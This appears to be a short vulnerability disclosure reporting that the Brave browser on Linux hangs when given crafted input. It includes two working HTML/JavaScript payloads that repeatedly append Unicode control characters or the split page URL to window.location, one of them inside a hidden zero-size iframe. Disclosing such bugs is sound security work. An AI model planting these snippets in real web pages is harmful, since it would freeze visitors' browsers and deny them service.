## Summary:

brave browser hangs due to no validation  for  a  code snippet causing denial of service to users.

## Products affected: 
latest brave browser in linux

## Steps To Reproduce:

code snippet:-

1) <script>window.location+='?\u202a\uFEFF\u202b';</script> 

OR

2) <iframe style="width:0;height:0;border:0" src="data:text/html;charset=utf-8,<script>window.location+='?'+window.location.toString().split('');</script>">

Note :- both these issues have been fixed in google chrome and firefox gives some delay time to close tabs.
